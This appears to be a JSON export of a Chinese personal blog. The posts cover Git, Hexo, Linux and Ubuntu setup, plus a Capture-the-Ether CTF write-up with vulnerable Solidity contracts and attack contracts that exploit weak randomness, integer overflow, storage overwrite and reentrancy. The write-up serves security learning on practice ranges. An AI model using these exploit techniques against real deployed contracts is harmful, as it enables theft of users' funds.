[{"title":"HelloGit","url":"/2025/03/03/HelloGit/","content":"什么是Git\n快查表\n\n\nWorkspace: 工作区\nIndex&#x2F;Stage: 暂存区\nRepository: 本地仓库\nRemote: 远程仓库\n\n新建代码库# 在当前目录下新建一个git仓库$ git init# 新建目录并创建仓库$ git init [project-name]# 在当前目录下下载一个项目和他的代码历史$ git clone [url]\n\ngitconfigGit 的配置文件\nGit CommitGit 仓库中的每一次提交都是一个快照，它记录了每次提交时的全部文件内容。但不同于将整个目录复制粘贴，它会将当前版本与仓库中上一个版本进行对比，并把所有差异打包到一起作为一个提交记录。与此同时，git 还保存了提交的历史记录，这也是为什么大多数提交记录上都有 parent 节点的原因。对于项目组成员而言，维护提交历史对大家都有好处。\nGit BranchGit的分支也只是简单地指向某个提交记录，因此，早建分支！多用分支！。分支并不会造成存储或内存上的开销，并且按逻辑分解工作到不同的分支要比维护那些特别臃肿的分支简单多了。\n\n在 git 2.23 版本中，引入了 git switch 的新命令，最终会取代 git checkout 。因为 checkout 作为单个命令承载了很多独立的功能。\n\nGit MergeGit的合并操作会把两个分支的提交记录合并到一起，形成一个新的提交记录。合并操作会把两个分支的冲突部分自动解决，但也有可能会出现合并失败的情况，这时就需要手动解决冲突。\n先看第一种方法： git merge \n git rebase取出一系列的提交记录，“复制”后在另外一个地方逐个的放下去。\n Rebase 的优势是可以创造更线性的提交历史。\nHEAD HEAD 总是指向当前分支名，也就是最新提交的快照。 大多数修改提交树的 git 命令都是从改变HEAD的指向开始的。\n分离的 HEAD 就是让其指向具体的提交记录而非分支名。\n"},{"title":"Capture-the-Ether","url":"/2023/04/01/Capture-the-Ether/","content":"\n由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助(TvT) (TvT) (TvT) (TvT) (TvT)\n\nLotteriesGuess Numberpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123;    uint8 answer = 42;    function GuessTheNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n题目直接给出了答案，直接填对于一个普通的数字，通过枚举它总是可以被猜中的，同时当有人知道了答案时，他就能直接获取奖励，很显然这对于其他不知道答案的人是极其不公平的；因此，我们对其进行处理改进：\nThe Secret Numberpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123;    ---不同点---    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    function GuessTheSecretNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (keccak256(n) == answerHash) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n由于结果是一个uint8的hash值所以我们只能够进行暴力枚举。\ncontract attack&#123;    function sol() public returns (uint8)&#123;        for(uint8 i=0;i&lt;255;i++)&#123;            if(keccak256(i)==            0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365)            &#123;retuen i;&#125;        &#125;    &#125;&#125;\n实现：这样的操作也只是避免了直接获取结果得出答案的情况——哈希算法是不可逆的加密算法，一定程度上提高了安全性，但仍然可以暴力枚举破解。\nThe Randon Numberpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123;    uint8 answer;    function GuessTheRandomNumberChallenge() public payable &#123;        require(msg.value == 1 ether);        ---不同点---        answer = uint8(keccak256(block.blockhash(block.number - 1), now));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n这次的结果是根据当前的区块数和时间来制定的，他是随机的，这样就大大的增强了安全强度，避免了反复使用一个结果。通过web3查询部署该合约时当前的区块高度和时间来得到answer，再进行输入即可。先获取合约所在块的高度或者区块哈希web3.eth.getTransaction(transactionHash).BlockNumber\\BlockHash再通过区块高度或区块哈希找当前区块的timestampweb3.eth.getBlock(BlockNumber).timestamp可以从返回值中看到\n\n另外，由于answer是存储在合约中的（storage）因此，只要我们理解了他是如何存储的我们也能够通过ethers.js中的getStorageAt方法来获取answer的值\n\nThe New Number在上一个的合约代码中我们可以看到answer是在合约部署时就已经赋值了，而这次我们将其放在方法中，只有在有用户使用这个方法时才对answer进行赋值操作。\npragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123;    function GuessTheNewNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n由于block.number状态变量允许获取当前块的高度。但是，在EVM中执行事务的那一刻，由于显而易见的原因，尚未知道正在创建的块的blockhash，所以我们无法通过web3进行查询，但是在我们调用这一合约时，是在同一个区块进行的，也就是说通过攻击合约进行模拟挑战中的所有操作然后调用guess方法，而不需要通过在链下进行计算再提交答案并保证交易在下一区块立即被挖矿的情形。\ncontract attack&#123;    GuessTheNewNumberChallenge gus;    function attack(address _add) public&#123;        gue = GuessTheNewNumberChallenge(_add);    &#125;    function att()public payable&#123;        uint8 val = uint8(keccak256(block.blockhash(block.number - 1), now));        gue.guess.value(1 ether)(val);    &#125;&#125;\nPredict the futurepragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123;    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(uint8 n) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n先下注，后开奖。由于不能预测未来区块的内容，所以对于answer我们无法准确掌握，但是这里的answer是一个0~9的数，因此我们可以设定一个值等待answer自己撞上来。\ncontract attack&#123;    PredictTheFutureChallenge pre;    uint8 public answer=2;          function attack(address _add)public&#123;        pre = PredictTheFutureChallenge(_add);    &#125;    function lock()public payable &#123;        pre.lockInGuess.value(1 ether)(answer);    &#125;    function sol() public &#123;        uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if(temp == answer)&#123;            pre.settle();        &#125;    &#125;&#125;\n\nPredict the block hashpragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123;    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(bytes32 hash) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n同样是预测未来区块的内容，显然这根本是不可能的。但是在EVM中block.blockhash保存的最大数目是最近的256个区块，也即是说当超出最新区块256个区块之后的block.blockhash将被置为0。因此我们同样只需要等。（10s一个块，256*10&#x2F;60 过个一小时吧（笑）\nMathToken sale要求：转走合约中的余额\npragma solidity ^0.4.21;contract TokenSaleChallenge &#123;    mapping(address =&gt; uint256) public balanceOf;    uint256 constant PRICE_PER_TOKEN = 1 ether;    function TokenSaleChallenge(address _player) public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance &lt; 1 ether;    &#125;    function buy(uint256 numTokens) public payable &#123;        require(msg.value == numTokens * PRICE_PER_TOKEN);        balanceOf[msg.sender] += numTokens;    &#125;    function sell(uint256 numTokens) public &#123;        require(balanceOf[msg.sender] &gt;= numTokens);        balanceOf[msg.sender] -= numTokens;        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);    &#125;&#125;\n分析：因为合约的货币只有两个方法sell()、buy()，所以我们只有卖出比我们所购买的更多的货币才能达成address(this).balance &lt; 1 ether的条件。在买入时有这么一个检查：require(msg.value == numToken * PRICE_PER_TOKEN)，因为PRICE_PER_TOKEN是一个不可修改的值，但可以通过与numToken的乘积进行溢出，从而绕过检查uint256的最大值为2^256-1：115792089237316195423570985008687907853269984665640564039457584007913129639935，所以该值除以10^18后添个一就是造成溢出的最小值：115792089237316195423570985008687907853269984665640564039457 + 1溢出的结果为415992086870360064所以我们只需要发送415992086870360064wei，提出115792089237316195423570985008687907853269984665640564039458的购买量就能够获得大量的货币。之后，我们卖出1 ether来完成挑战\nToken Whale要求：拥有1,000,000的余额\npragma solidity ^0.4.21;contract TokenWhaleChallenge &#123;    address player;    uint256 public totalSupply;    mapping(address =&gt; uint256) public balanceOf;    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    string public name = &quot;Simple ERC20 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    function TokenWhaleChallenge(address _player) public &#123;        player = _player;        totalSupply = 1000;        balanceOf[player] = 1000;    &#125;    function isComplete() public view returns (bool) &#123;        return balanceOf[player] &gt;= 1000000;    &#125;    event Transfer(address indexed from, address indexed to, uint256 value);    function _transfer(address to, uint256 value) internal &#123;        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);    &#125;    function transfer(address to, uint256 value) public &#123;        require(balanceOf[msg.sender] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        _transfer(to, value);    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    function approve(address spender, uint256 value) public &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);    &#125;    function transferFrom(address from, address to, uint256 value) public &#123;        require(balanceOf[from] &gt;= value);        require(balanceOf[to] + value &gt;= balanceOf[to]);        require(allowance[from][msg.sender] &gt;= value);        allowance[from][msg.sender] -= value;        _transfer(to, value);    &#125;&#125;\n分析：合约是一个与ERC20标准类似的货币，没有使用SafeMath库进行检查，问题更大的是transferFrom()函数中调用_transfer()不是在from和to之间的交易而是msg.sender和to之间的交易，这就是漏洞的关键我们可以利用一份代理地址，玩家可以给代理地址分配任意的allowance，由代理地址向玩家和另一个地址进行transferFrom()，这样在执行_transfer()的过程中，代理地址的余额将会发生溢出，获得大量的货币，最后再将代理地址的余额用transfer()转移给玩家就可以通过挑战了大致流程player：addr1ToAccount：addr2ProxyAccount：addr3  \n\nplayer.approve(addr3,1000000)        &#x2F;&#x2F;满足后续allowance[player][ProxyAccount]的条件  \nProxyAccount.transferFrom(addr1,addr2,1)        &#x2F;&#x2F;ToAccount无关紧要，交易完成后balanceOf[addr3]将会获得很多\nProxyAccount.transfer(player,1000000)        &#x2F;&#x2F;将获得的余额转入玩家地址\n\nRetirement fund源代码：\npragma solidity ^0.4.21;contract RetirementFundChallenge &#123;    uint256 startBalance;    address owner = msg.sender;    address beneficiary;    uint256 expiration = now + 10 years;    function RetirementFundChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        beneficiary = player;        startBalance = msg.value;    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function withdraw() public &#123;        require(msg.sender == owner);        if (now &lt; expiration) &#123;            // early withdrawal incurs a 10% penalty            msg.sender.transfer(address(this).balance * 9 / 10);        &#125; else &#123;            msg.sender.transfer(address(this).balance);        &#125;    &#125;    function collectPenalty() public &#123;        require(msg.sender == beneficiary);        uint256 withdrawn = startBalance - address(this).balance;        // an early withdrawal occurred        require(withdrawn &gt; 0);        // penalty is what&#x27;s left        msg.sender.transfer(address(this).balance);    &#125;&#125;\n\n分析：要能够进行transfer操作除了own本人进行withdraw后，我们才能进行。但是因为withdrawn是一个uint256的数，我们只要往合约中投入一点ether，使得withdrawn发生溢出就能够绕过要求进行提款。攻击实现：我们看到在合约中并没有任何接受ether的方法，所以不能向合约直接发送ether，所以这里需要通过函数selfdestruct可参考Ethernaut 题8\nMapping源代码：\npragma solidity ^0.4.21;contract MappingChallenge &#123;    bool public isComplete;    uint256[] map;    function set(uint256 key, uint256 value) public &#123;        // Expand dynamic array as needed        if (map.length &lt;= key) &#123;            map.length = key + 1;        &#125;        map[key] = value;    &#125;    function get(uint256 key) public view returns (uint256) &#123;        return map[key];    &#125;&#125;\n\nDonation要求：取走合约中的钱源代码：\npragma solidity ^0.4.21;contract DonationChallenge &#123;    struct Donation &#123;        uint256 timestamp;        uint256 etherAmount;    &#125;    Donation[] public donations;    address public owner;    function DonationChallenge() public payable &#123;        require(msg.value == 1 ether);                owner = msg.sender;    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function donate(uint256 etherAmount) public payable &#123;        // amount is in ether, but msg.value is in wei        uint256 scale = 10**18 * 1 ether;        require(msg.value == etherAmount / scale);        Donation donation;        donation.timestamp = now;        donation.etherAmount = etherAmount;        donations.push(donation);    &#125;    function withdraw() public &#123;        require(msg.sender == owner);                msg.sender.transfer(address(this).balance);    &#125;&#125;\n分析：只有成为owner才能进行withdraw，将钱取出来。（合约中没有任何直接修改owner的方法）在donate函数中直接对结构体Donation进行了初始化，并没有使用memory关键字，于是此处的Donation存储在storage中，由合约对属性的定义顺序，owner的key值为1，恰好donation.etherAmount会将其覆盖，也就是说：我们只需要将我们的地址作为参数执行donate方法便可以更改owner。因为require(msg.value == etherAmount / scale)这一条件。我们将自己的地址进行计算一下，来得知我们需要向合约发送多少value。\n实现：\nfunction getValut(uint256 amount) public pure returns (uint2565) &#123;    return amount / 10**36;&#125;\n通过计算得出msg.value的值为979192615699在执行donate方法成功后我们再次调用owner可以看到owner已经是我们自己的地址了，接着进行withdraw就可以通关了。\nFifty years要求：等到50年后取走合约中的money源代码：\npragma solidity ^0.4.21;contract FiftyYearsChallenge &#123;    struct Contribution &#123;        uint256 amount;        uint256 unlockTimestamp;    &#125;    Contribution[] queue;    uint256 head;    address owner;    function FiftyYearsChallenge(address player) public payable &#123;        require(msg.value == 1 ether);        owner = player;        queue.push(Contribution(msg.value, now + 50 years));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function upsert(uint256 index, uint256 timestamp) public payable &#123;        require(msg.sender == owner);        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;            // Update existing contribution amount without updating timestamp.            Contribution storage contribution = queue[index];            contribution.amount += msg.value;        &#125; else &#123;            // Append a new contribution. Require that each contribution unlock            // at least 1 day after the previous one.            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);            contribution.amount = msg.value;            contribution.unlockTimestamp = timestamp;            queue.push(contribution);        &#125;    &#125;    function withdraw(uint256 index) public &#123;        require(msg.sender == owner);        require(now &gt;= queue[index].unlockTimestamp);        // Withdraw this and any earlier contributions.        uint256 total = 0;        for (uint256 i = head; i &lt;= index; i++) &#123;            total += queue[i].amount;            // Reclaim storage.            delete queue[i];        &#125;        // Move the head of the queue forward so we don&#x27;t have to loop over        // already-withdrawn contributions.        head = index + 1;        msg.sender.transfer(total);    &#125;&#125;\n分析：第一点：如何解决50年的时间问题：这里的unlockTimestamp可以发生上溢从而归零。所以在upsert函数中通过设置timestamp=0可以将时间限制解除。于是需要对upsert进行两次调用，第一次将unlockTimeStamp设置为+1days就能发生溢出的极限值，第二次调用就可以绕过检查设置为0。根据前面几题的经验可以看到在upsert函数中contribution.amount和contribution.unlockTimestamp都造成了变量覆盖：分别将queue的长度和head的值进行了覆盖。实现：\n\n部署合约\n进行第一次upsert调用，设置为时间溢出的极限值这里应该设1wei，否则queue的length不够\n进行第二次upsert调用，设置为0\n\n第一次调用中同时改变了head的值，index大于2不是硬性要求4. 第三次进行withdraw调用\nAccounts这一部分有一些关于以太坊的密码学原理包括椭圆曲线加密，ECDSA签名算法等，他们与合约漏洞并无关系\nFuzzy identity要求：获取私钥源代码：\npragma solidity ^0.4.21;interface IName &#123;    function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123;    bool public isComplete;    function authenticate() public &#123;        require(isSmarx(msg.sender));        require(isBadCode(msg.sender));        isComplete = true;    &#125;    function isSmarx(address addr) internal view returns (bool) &#123;        return IName(addr).name() == bytes32(&quot;smarx&quot;);    &#125;    function isBadCode(address _addr) internal pure returns (bool) &#123;        bytes20 addr = bytes20(_addr);        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;        for (uint256 i = 0; i &lt; 34; i++) &#123;            if (addr &amp; mask == id) &#123;                return true;            &#125;            mask &lt;&lt;= 4;            id &lt;&lt;= 4;        &#125;        return false;    &#125;&#125;\n分析：要通过验证需要通过isSmarx()和isBadCode()的验证，因此需要一个能返回一个特殊名字smarx的合约以及合约地址包含十六进制字符串badc0de。因此，这个挑战就是要暴力破解大量合约，直到你最终获得一个包含目标字符串的合约地址\n\ntips：十六进制字面常数十六进制字面常数以关键字 hex 打头，后面紧跟着用单引号或双引号引起来的字符串（例如，hex”001122FF”）。 字符串的内容必须是一个十六进制的字符串，它们的值将使用二进制表示。它们可以隐式地转换成 bytes1，……，bytes32，如果合适的话，还可以转换成 bytes 以及 string。\n\nPublic Key要求：账户的公钥源代码：\npragma solidity ^0.4.21;contract PublicKeyChallenge &#123;    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;    bool public isComplete;    function authenticate(bytes publicKey) public &#123;        require(address(keccak256(publicKey)) == owner);        isComplete = true;    &#125;&#125;\n我们都知道以太坊的地址与比特币的一样由公钥计算而来。在用户进行交易时往往需要进行签名，而这个签名中就含有公钥（供其他人验证交易来自于该账户），\nAccount Takeover要求：成为owner源代码：\npragma solidity ^0.4.21;contract AccountTakeoverChallenge &#123;    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;    bool public isComplete;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n\nMiscellaneousAssume ownership要求：成为owner源代码：  \npragma solidity ^0.4.21;contract AssumeOwnershipChallenge &#123;    address owner;    bool public isComplete;    function AssumeOwmershipChallenge() public &#123;        owner = msg.sender;    &#125;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n分析：构造函数的错误使其变成了一个公共的方法，使得任何人都可以直接使用来声明所有权。\nToken bank要求：获取Token合约中的余额源代码：\npragma solidity ^0.4.21;interface ITokenReceiver &#123;    function tokenFallback(address from, uint256 value, bytes data) external;&#125;contract SimpleERC223Token &#123;    // Track how many tokens are owned by each address.    mapping (address =&gt; uint256) public balanceOf;    string public name = &quot;Simple ERC223 Token&quot;;    string public symbol = &quot;SET&quot;;    uint8 public decimals = 18;    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);    event Transfer(address indexed from, address indexed to, uint256 value);    function SimpleERC223Token() public &#123;        balanceOf[msg.sender] = totalSupply;        emit Transfer(address(0), msg.sender, totalSupply);    &#125;    function isContract(address _addr) private view returns (bool is_contract) &#123;        uint length;        assembly &#123;            //retrieve the size of the code on target address, this needs assembly            length := extcodesize(_addr)        &#125;        return length &gt; 0;    &#125;    function transfer(address to, uint256 value) public returns (bool success) &#123;        bytes memory empty;        return transfer(to, value, empty);    &#125;    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;        require(balanceOf[msg.sender] &gt;= value);        balanceOf[msg.sender] -= value;        balanceOf[to] += value;        emit Transfer(msg.sender, to, value);        if (isContract(to)) &#123;            ITokenReceiver(to).tokenFallback(msg.sender, value, data);        &#125;        return true;    &#125;    event Approval(address indexed owner, address indexed spender, uint256 value);    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;    function approve(address spender, uint256 value)        public        returns (bool success)    &#123;        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    &#125;    function transferFrom(address from, address to, uint256 value)        public        returns (bool success)    &#123;        require(value &lt;= balanceOf[from]);        require(value &lt;= allowance[from][msg.sender]);        balanceOf[from] -= value;        balanceOf[to] += value;        allowance[from][msg.sender] -= value;        emit Transfer(from, to, value);        return true;    &#125;&#125;contract TokenBankChallenge &#123;    SimpleERC223Token public token;    mapping(address =&gt; uint256) public balanceOf;    function TokenBankChallenge(address player) public &#123;        token = new SimpleERC223Token();        // Divide up the 1,000,000 tokens, which are all initially assigned to        // the token contract&#x27;s creator (this contract).        balanceOf[msg.sender] = 500000 * 10**18;  // half for me        balanceOf[player] = 500000 * 10**18;      // half for you    &#125;    function isComplete() public view returns (bool) &#123;        return token.balanceOf(this) == 0;    &#125;    function tokenFallback(address from, uint256 value, bytes) public &#123;        require(msg.sender == address(token));        require(balanceOf[from] + value &gt;= balanceOf[from]);        balanceOf[from] += value;    &#125;    function withdraw(uint256 amount) public &#123;        require(balanceOf[msg.sender] &gt;= amount);        require(token.transfer(msg.sender, amount));        balanceOf[msg.sender] -= amount;    &#125;&#125;\n分析：合约自定义了ERC-233标准，（ERC-233与ERC-20的不同之处在于如果接收人的地址是一个合约将会通过tokenFallback方法来通知接收方转移。在Token合约创建的时候，就有一百万的token余额，其中50万给了创建者，50万给了玩家。所以需要获取更多的token来完成挑战。可以看到如果我们通过攻击合约利用Token合约向Bank转账时，会触发isContract执行Bank合约中的tokenFallback从而增加Bank中的余额，之后我们再通过withdraw向Bank取款就行了。  \n\n同时在withdraw函数中合约先向我们转账再减我们的余额，这使得我们可以重复地提取我们的余额，重入的过程将会是：challenge.withdraw() -&gt; token.transfer() -&gt; msg.sender.tokenFallback() -&gt; ... 直到余额为0。\n\n实现：先部署攻击合约，再将攻击合约作为player部署Bank接着直接调用CallWithdraw（执行成功后，可以在交易日志中看到进行了两次transfer调用。进入tokenFallback后又调用了一次）\n","categories":["靶场"],"tags":["题解","CapturetheEther","Remix"]},{"title":"Hello World","url":"/2022/12/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"VMware_ubuntu","url":"/2023/11/13/VMware-ubuntu/","content":"\n操作环境：VMware：Ubuntu：20.04\n常用命令：\n遇见的坑：\nGolang安装：\n在安装Golang语言的时候，通过执行下面命令后会默认安装最新版本。\nsudo add-apt-repository ppa:longsleep/golang-backports\nsudo apt updata\nsudo apt install golang-go\n安装完成后，要设置GOROOT、GOPATH等环境变量，使用\nsudo vi ~/.profile\n编辑以下内容：\nexport GOROOT=&quot;/usr/lib/go&quot;export GOBIN=$GOROOT/binexport GOPATH=export GO111MODULE=autoexport PATH=$PATH:$GOPATH/bin\n修改完成后使用\nsource ~/.profile\n进行重新生效。此时可以通过go version或$GOROOT命令进行验证是否安装成功。\n而博主要使用某个低版本的Golang语言，采用了apt search后进行apt install正常安装完成后。\n在修改完环境变量后仍然显示\n"},{"url":"/2025/02/28/hexo/","content":"Hexo备忘录Hexo是一个基于Node.js的静态博客框架，可以快速搭建个人博客。本文记录了一些常用的Hexo命令及配置。\nHexo的安装需求：\n\nNode.js(版本建议使用12.0及以上)\nGit\n\n满足上述的应用程序后即可使用npm安装Hexo。  \n$ npm install -g hexo-cli\n\n如有需要，可以在局部安装hexo包，安装以后，使用npx hexo &lt;command&gt;执行Hexo。\n\nHexo的常用命令hexo的初始化在安装hexo完成后，通过执行以下命令在指定文件夹中新建所需的文件。\n$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install\n初始化完成后，你的项目文件将如下所示：\n.├── _config.yml├── package.json├── scafffolds├── source|   ├── _drafts|   └── _posts└── themes\n\n_config.ymlHexo的配置文件，主要配置了网站的基本信息，主题，插件等。\npackage.jsonscafffolds模版文件夹，Hexo的脚手架，用于快速生成文章模板。\nsource资源文件夹，存放你所有资源的地方。除_post文件夹之外，开头名为_（下划线）的文件、文件夹和隐藏的文件将会被忽略。\nthemes主题文件夹，能够根据主题来渲染静态页面。\nhexo new$ hexo new [layout] &lt;title&gt;\n新建一篇文章，未指定layout时，默认使用_config.yml中的default_layout。\nhexo generate$ hexo generate\n生成静态文件。\nhexo publishhexo serverhexo deploy"},{"title":"linux","url":"/2025/09/02/linux/","content":"1 Linux系统简介及安装Linux 是一个自由和开放源码的类 UNIX 操作系统内核。它是由林纳斯・托瓦兹（Linus Torvalds）于 1991 年首次发布的。Linux 系统以其稳定性、安全性和灵活性而闻名，广泛应用于服务器、桌面、移动设备和嵌入式系统。\n1.1 Linux系统的特点开源自由：Linux 的源代码可以被任何人查看、修改和分发。稳定安全：Linux 系统经过严格的测试，具有很高的稳定性和安全性。资源占用少：Linux 系统对硬件资源的要求较低，可以在老旧的硬件上高效运行。强大的社区支持：全球有大量的开发者和技术爱好者支持 Linux 的发展。  \n1.2 Linux系统的安装1.2.1 光盘安装1.2.2 USB闪存安装1.2.3 虚拟机安装2 Linux系统的基本操作Linux文件系统是Linux操作系统中用于组织和存储文件和目录的结构。它采用层次化的目录结构，所有文件和目录都从根目录（&#x2F;）开始。\n每个文件都组织在一个分层的目录树中，这些文件和目录的位置被称为路径。有两种类型的路径：绝对路径和相对路径。\n绝对路径：从根目录开始的完整路径。\n相对路径：相对于当前工作目录的路径。\n\n. (当前目录)：当前所在的目录\n.. (上级目录)：当前目录的父目录\n~ (用户主目录)：当前用户的主目录\n\n(上一个目录)：上一次所在的目录\n\n\n\n2.1 文件系统的结构\n根目录（&#x2F;）：所有文件和目录的起点。\n&#x2F;bin：存放二进制可执行文件。\n&#x2F;etc：存放系统配置文件。\n&#x2F;home：用户的主目录。\n&#x2F;var：存放可变数据，如日志文件。\n&#x2F;usr：存放用户程序和数据。\n&#x2F;tmp：存放临时文件。\n&#x2F;dev：存放设备文件。\n&#x2F;root：超级用户的主目录。\n\n2.2 常用命令\nls：列出目录内容。\ncd：更改当前目录。\npwd：显示当前目录路径。\ncp：复制文件或目录。\nmv：移动或重命名文件或目录。\nrm：删除文件或目录。\nmkdir：创建新目录。\nrmdir：删除空目录。\ntouch：创建空文件或更新文件的时间戳。\ncat：显示文件内容。\nmore&#x2F;less：分页显示文件内容。\nfind：查找文件或目录。\ngrep：搜索文件内容。\nchmod：更改文件或目录的权限。\nps：显示当前运行的进程。\nkill：终止进程。\ntar：打包和解包文件。\nzip&#x2F;unzip：压缩和解压文件。\nssh：远程登录到另一台计算机。\nscp：在本地和远程计算机之间复制文件。\nwget：从网络下载文件。\ncurl：与服务器进行数据传输。\n\n2.3 系统管理命令\nsystemctl：管理系统服务。\ntop：实时显示系统资源使用情况。\ndf：显示文件系统的磁盘空间使用情况。\ndu：显示文件或目录的磁盘使用情况。\nifconfig&#x2F;ip：显示或配置网络接口。\nping：测试网络连接。\nnetstat：显示网络连接、路由表和接口统计。\n\n2.4 终端操作终端打开方式：快捷键：Ctrl + Alt + T菜单右键：Open Terminal直接Ctrl + Alt + F2 进入纯命令行模式\nsudo !!以前执行的命令加上sudo权限重新执行\n常用文本编辑器vim：功能强大的文本编辑器，适合编写和编辑代码。nano：简单易用的文本编辑器，适合快速编辑文件。gedit：图形化文本编辑器，适合初学者使用。\n脚本编写基础\n软件包管理与仓库使用3.1 软件包管理工具APT（Advanced Package Tool）：用于Debian及其衍生版（如Ubuntu）的包管理工具。常用命令包括：\n\nsudo apt update：更新软件包列表。\nsudo apt upgrade：升级已安装的软件包。\nsudo apt install ：安装指定的软件包。\nsudo apt remove ：卸载指定的软件包。\nsudo apt search ：搜索软件包。\n\nShell根据发行版的不同，Linux 系统可能预装了不同的 Shell。常见的 Shell 包括 Bash（Bourne Again Shell）、Zsh（Z Shell）和 Fish（Friendly Interactive Shell）。其中，Bash 是最常用和广泛支持的 Shell。你的 Shell 提示符可能会有所不同，但多数情况下，它应该遵循以下格式:\nusername@hostname:current_directory$\n不同的shell会有不同的提示符风格，例如：$\necho 命令，将文本参数打印到显示器上。\npwd 命令，显示当前工作目录的完整路径。\ncd 命令，改变当前工作目录。\nls 命令，列出当前目录下的文件和子目录\nls 会默认列出当前目录中的目录和文件，但也可以指定要列出其目录的路径。\n\n并非目录中的所有文件都可见，某些文件可能是隐藏的。以点 (.) 开头的文件被视为隐藏文件。但是可以使用 -a 选项来显示所有文件，包括隐藏文件。还有一个有用的选项是 -l，它以长格式列出文件，显示有关每个文件的更多信息，从左到右依次为：文件类型和权限、链接数、所有者、组、文件大小、最后修改时间和文件名。\n\ntouch 命令，创建一个新的空文件，或者更新现有文件的访问和修改时间。\nfile 命令，确定文件类型。\nSSHssh (Secure Shell) 是一种用于安全远程登录和其他网络服务的协议。它通过加密连接来保护数据传输，确保通信的机密性和完整性。SSH 广泛用于系统管理员和开发人员，以便安全地访问远程服务器和执行命令。\n"},{"url":"/2025/07/15/WebSocket/","content":"ConstructorWebSocket()\n返回一个WebSocket对象。\n参数url: 